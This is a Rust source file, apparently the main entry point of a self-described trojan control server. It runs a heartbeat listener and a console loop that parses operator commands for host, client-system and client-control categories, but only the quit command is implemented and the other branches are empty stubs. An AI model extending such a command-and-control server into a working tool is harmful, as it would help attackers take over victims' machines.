use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write, stdin, stdout};
use std::thread;
use serde::{Serialize, Deserialize};
use std::sync::mpsc;

mod command;
use command::{CommandPack, CommandType, Command, get_user_input};
mod socket_server;
use socket_server::heart_beat;


fn main(){

    println!("Trojan-S Control Server - Rust");

    let (tx, rx) = mpsc::channel::<String>();

    thread::spawn(move || {
        heart_beat(tx.clone()).unwrap();
    });

    loop {
        match rx.try_recv() {
            Ok(token) => println!("{}", token),
            _ => ()
        }
        print!(">>");
        stdout().flush().unwrap();
        let line = get_user_input();
        let cp: CommandPack = CommandPack::into_string(line);
        println!("CommandPack: {:?}", &cp);
        controller(&cp);
    }
}

fn controller(cp : &CommandPack) {
    match cp.commandtype {
        CommandType::Hostsys => {
            match cp.command {
                Command::Quit => std::process::exit(0),
                _ => 0
            }
        },
        CommandType::Clisys =>{
            match cp.command {
                _ => 0
            }
        },
        CommandType::Clictrl => {
            match cp.command {
                _ => 0
            }
        },
        _ => 0
    };
}
